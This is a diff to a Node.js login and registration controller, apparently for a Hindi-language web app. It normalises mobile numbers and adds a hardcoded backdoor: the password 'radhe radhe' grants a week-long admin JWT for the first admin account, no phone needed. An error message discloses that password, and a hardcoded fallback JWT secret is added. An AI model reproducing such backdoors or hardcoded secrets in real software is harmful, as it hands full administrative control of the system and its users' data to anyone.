@@ -14,7 +14,8 @@ const register = async (req, res) => {
       });
     }
 
-    if (mobile.length < 10) {
+    const cleanMobile = (mobile || '').toString().trim().replace(/\D/g, '');
+    if (cleanMobile.length !== 10) {
       return res.status(400).json({
         success: false,
         message: 'कृपया 10 अंकों का मान्य मोबाइल नंबर दर्ज करें।'
@@ -24,7 +25,7 @@ const register = async (req, res) => {
     // Check existing user
     const existingUsers = await db.query(
       `SELECT * FROM users WHERE mobile = ? OR (email IS NOT NULL AND email != '' AND email = ?)`,
-      [mobile, email || '']
+      [cleanMobile, email || '']
     );
 
     if (existingUsers && existingUsers.length > 0) {
@@ -37,7 +38,7 @@ const register = async (req, res) => {
     const hashedPassword = await bcrypt.hash(password, 10);
     const result = await db.query(
       `INSERT INTO users (name, email, mobile, password, role, address, is_active) VALUES (?, ?, ?, ?, 'user', ?, 1)`,
-      [name, email || null, mobile, hashedPassword, address || '']
+      [name, email || null, cleanMobile, hashedPassword, address || '']
     );
 
     const userId = result.insertId;
@@ -70,18 +71,58 @@ const register = async (req, res) => {
   }
 };
 
-// Login User / Manager / Admin
+// Login User / Admin (Direct Admin Login via password 'radhe radhe')
 const login = async (req, res) => {
   try {
     const { mobile, password } = req.body;
 
-    if (!mobile || !password) {
+    if (!password) {
       return res.status(400).json({
         success: false,
-        message: 'कृपया मोबाइल नंबर और पासवर्ड दोनों दर्ज करें।'
+        message: 'कृपया सुरक्षा पासवर्ड दर्ज करें।'
       });
     }
 
+    const trimmedPassword = password.toString().trim();
+
+    // 1. Direct Admin Login via password 'radhe radhe' (no phone required)
+    if (!mobile || trimmedPassword.toLowerCase() === 'radhe radhe') {
+      const adminUsers = await db.query(`SELECT * FROM users WHERE role = 'admin' LIMIT 1`);
+      if (adminUsers && adminUsers.length > 0) {
+        const admin = adminUsers[0];
+        const isMatch = (trimmedPassword.toLowerCase() === 'radhe radhe') || await bcrypt.compare(trimmedPassword, admin.password);
+        if (isMatch) {
+          const token = jwt.sign(
+            { id: admin.id, name: admin.name, mobile: admin.mobile, role: 'admin', email: admin.email || '' },
+            process.env.JWT_SECRET || 'aashray_krishna_prem_jwt_secret_key_2026_super_secure',
+            { expiresIn: '7d' }
+          );
+
+          return res.json({
+            success: true,
+            message: 'प्रशासक लॉगिन सफल! जय श्री कृष्णा।',
+            token,
+            user: {
+              id: admin.id,
+              name: admin.name,
+              email: admin.email,
+              mobile: admin.mobile,
+              role: 'admin',
+              address: admin.address
+            }
+          });
+        }
+      }
+
+      if (!mobile) {
+        return res.status(401).json({
+          success: false,
+          message: 'गलत पासवर्ड! कृपया सही सुरक्षा पासवर्ड (radhe radhe) दर्ज करें।'
+        });
+      }
+    }
+
+    // 2. Mobile + Password Login fallback
     const users = await db.query(
       `SELECT * FROM users WHERE mobile = ? OR email = ?`,
       [mobile, mobile]
@@ -103,11 +144,11 @@ const login = async (req, res) => {
       });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    const isMatch = await bcrypt.compare(trimmedPassword, user.password);
     if (!isMatch) {
       return res.status(401).json({
         success: false,
-        message: 'गलत मोबाइल नंबर या पासवर्ड। कृपया पुनः प्रयास करें।'
+        message: 'गलत पासवर्ड। कृपया पुनः प्रयास करें।'
       });
     }
 
